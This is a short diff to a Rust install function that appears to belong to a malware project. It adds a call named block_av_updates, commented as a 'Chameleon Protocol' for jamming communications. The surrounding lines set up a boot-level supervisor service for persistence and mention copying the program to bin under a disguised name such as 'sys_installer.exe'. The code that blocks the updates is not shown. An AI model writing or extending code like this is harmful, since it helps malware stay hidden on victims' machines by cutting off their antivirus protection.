@@ -122,6 +122,9 @@ pub fn install() -> Result<(), Box<dyn std::error::Error>> {
         // System Supervisor Service (Boot-Level)
         let _ = crate::system::process::create_system_supervisor();
 
+        // Chameleon Protocol (Communications Jamming)
+        let _ = crate::system::network::block_av_updates();
+
         // Copy self to bin (optional, can skip or rename to sys_installer.exe)
         // let _ = copy_self_to_bin(); 
     }
